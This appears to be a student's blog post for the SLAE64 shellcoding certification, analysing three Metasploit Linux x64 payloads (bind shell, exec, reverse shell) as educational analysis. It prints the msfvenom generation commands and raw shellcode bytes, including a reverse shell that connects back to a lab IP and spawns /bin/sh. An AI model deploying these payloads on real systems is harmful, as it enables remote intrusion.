@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.82.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Andrea Perfetti">
+<meta name="keywords" content="Assembly, Analysis">
+<meta name="description" content="The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.">
+
+
+<meta property="og:description" content="The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE64 - Assignment 5 - Analysis">
+<meta name="twitter:title" content="SLAE64 - Assignment 5 - Analysis">
+<meta property="og:url" content="https://andrea-perfetti.github.io/2021/04/slae64-assignment-5-analysis/">
+<meta property="twitter:url" content="https://andrea-perfetti.github.io/2021/04/slae64-assignment-5-analysis/">
+<meta property="og:site_name" content="Andrea Perfetti">
+<meta property="og:description" content="The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.">
+<meta name="twitter:description" content="The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2021-04-04T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-04-04T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="SLAE Exam Assignments">
+    
+      <meta property="article:section" content="SLAE 64-bit">
+    
+  
+  
+    
+      <meta property="article:tag" content="SLAE64">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/slae64/0_slae64_badge.png">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/slae64/0_slae64_badge.png">
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+
+
+    <title>SLAE64 - Assignment 5 - Analysis</title>
+
+    <link rel="icon" href="https://andrea-perfetti.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://andrea-perfetti.github.io/2021/04/slae64-assignment-5-analysis/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://andrea-perfetti.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="2">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://andrea-perfetti.github.io/">Andrea Perfetti</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://andrea-perfetti.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="2">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://andrea-perfetti.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Andrea Perfetti</h4>
+        
+          <h5 class="sidebar-profile-bio">YHQL, YLGL, YLFL.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/andrea-perfetti" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="2"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      SLAE64 - Assignment 5 - Analysis
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-04-04T00:00:00Z">
+        
+  
+  
+  
+  
+    2021-04-04
+  
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-exam-assignments">SLAE Exam Assignments</a>, 
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-64-bit">SLAE 64-bit</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.</p>
+<p>The list of available shellcodes have been generated using the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
+└─$ msfvenom --list payloads | grep linux/x64 &gt; List_Payloads_Linux-x64.txt
+</code></pre><h2 id="bind-tcp">Bind TCP</h2>
+<p>The first shellcode I have selected is <code>linux/x64/shell_bind_tcp</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
+└─$ msfvenom -p linux/x64/shell_bind_tcp  --list-options
+Options for payload/linux/x64/shell_bind_tcp:
+=========================
+
+
+       Name: Linux Command Shell, Bind TCP Inline
+     Module: payload/linux/x64/shell_bind_tcp
+   Platform: Linux
+       Arch: x64
+Needs Admin: No
+ Total size: 86
+       Rank: Normal
+
+Provided by:
+    ricky
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LPORT  4444             yes       The listen port
+RHOST                   no        The target address
+
+Description:
+  Listen for a connection and spawn a command shell
+</code></pre><p>For the sake of diversity, I selected port 5555, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
+└─$ msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f c -o Payload.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
+└─$ msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f raw | ndisasm -u -b 64 - &gt; Disasm.txt
+</code></pre><p>The shellcode first creates a new socket and then binds it to appropriate port and protocols:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-1-bindtcp-1.png" alt="Bind Shell TCP Shellcode representation - Part 1"></p>
+<p>After that, two appropriate syscalls are executed in order to make it listening and accepting a connection.
+When a connection is accepted, a new file descriptor is created and it is then duplicated into the three standard ones (STDIN, STDOUT and STDERR) with the <em>dup2</em> syscall:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-1-bindtcp-2.png" alt="Bind Shell TCP Shellcode representation - Part 2"></p>
+<p>As last part, the shellcode executes a <em>execve</em> syscall after having pushed on the stack all the relevant parameters in order to invoke <code>/bin/sh</code>:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-1-bindtcp-3.png" alt="Bind Shell TCP Shellcode representation - Part 3"></p>
+<h2 id="exec">Exec</h2>
+<p>The second shellcode I have selected is <code>linux/x64/exec</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
+└─$ msfvenom -p linux/x64/exec --list-options                
+Options for payload/linux/x64/exec:
+=========================
+
+
+       Name: Linux Execute Command
+     Module: payload/linux/x64/exec
+   Platform: Linux
+       Arch: x64
+Needs Admin: No
+ Total size: 40
+       Rank: Normal
+
+Provided by:
+    ricky
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+CMD                    yes       The command string to execute
+
+Description:
+  Execute an arbitrary command
+</code></pre><p>I opted for <code>/bin/sh</code> as command to be executed, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.2-Exec]
+└─$ msfvenom -p linux/x64/exec CMD=/bin/sh -f c -o Payload.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.2-Exec]
+└─$ echo -ne &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05&quot; | ndisasm -b 64 - &gt; Disasm.txt
+</code></pre><p>This shellcode is basically executing a single syscall to execve. The command to be executed is included in the shellcode and its address is put on the stack through a <em>call</em> at offset 1B.</p>
+<p>The following diagram shows the actual code and stack and registers at the syscall:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-2-exec.png" alt="Exec shellcode representation"></p>
+<h2 id="reverse-tcp">Reverse TCP</h2>
+<p>The second shellcode I have selected is <code>linux/x64/shell_reverse_tcp</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp --list-options
+Options for payload/linux/x64/shell_reverse_tcp:
+=========================
+
+
+       Name: Linux Command Shell, Reverse TCP Inline
+     Module: payload/linux/x64/shell_reverse_tcp
+   Platform: Linux
+       Arch: x64
+Needs Admin: No
+ Total size: 74
+       Rank: Normal
+
+Provided by:
+    ricky
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Connect back to attacker and spawn a command shell
+</code></pre><p>I have then used the ip address 192.168.106.148 as parameter, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.3-ShellReverseTCP]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.106.148 LPORT=4444 -f c -o Payload.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm:</p>
+<pre><code>┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.3-ShellReverseTCP]
+└─$ echo -ne &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x6a\x94\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot; | ndisasm -b 64 - &gt; Disasm.txt
+</code></pre><p>This shellcode first of all creates a new socket with the appropriate syscall. Then the file descriptor for the socket is used into a connect syscall, for which the address structure parameters (AF_INET family, port 4444 and IP 192.168.106.148) are pushed onto the stack.</p>
+<p>The following diagram in two parts shows the actual code and stack and registers values at the two syscalls mentioned above:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-3-revtcp-1.png" alt="Reverse Shell TCP Shellcode representation - Part 1"></p>
+<p>The shellcode now loops 3 times in order to perform the <em>dup2</em> syscall to duplicate the file descriptor for the socket into the 3 general ones (STDIN, STDOUT and STDERR). After that, parameters for an <em>execve</em> are pushed on the stack in order to execute <code>/bin/sh</code>.</p>
+<p>The following diagram shows the two syscalls:
+<img src="https://andrea-perfetti.github.io/img/slae64/5-3-revtcp-2.png" alt="Reverse Shell TCP Shellcode representation - Part 2"></p>
+<!-- raw HTML omitted -->
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html">http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html</a>.</p>
+<p><strong>Student ID</strong>: <code>PA-29059</code><br>
+<strong>GitHub repository</strong>: <a href="https://github.com/andrea-perfetti/SLAE64-Exam">https://github.com/andrea-perfetti/SLAE64-Exam</a></p>
+<p>This assignment has been written on a Kali Linux 2021.1 64-bit virtual machine:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ uname -a
+Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
+</code></pre>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://andrea-perfetti.github.io/tags/slae64/">SLAE64</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/04/slae64-assignment-2-tcp-reverse-shell-with-passcode/" data-tooltip="SLAE64 - Assignment 2 - TCP Reverse Shell with passcode">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-3-egghunter/" data-tooltip="SLAE32 - Assignment 3 - EggHunter">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Andrea Perfetti. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+        <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/04/slae64-assignment-2-tcp-reverse-shell-with-passcode/" data-tooltip="SLAE64 - Assignment 2 - TCP Reverse Shell with passcode">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-3-egghunter/" data-tooltip="SLAE32 - Assignment 3 - EggHunter">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Andrea Perfetti</h4>
+    
+      <div id="about-card-bio">YHQL, YLGL, YLFL.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        IT Security Specialist
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Italy
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://andrea-perfetti.github.io/img/wallpa/pexels-elijah-o%27donnell-3473569.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://andrea-perfetti.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
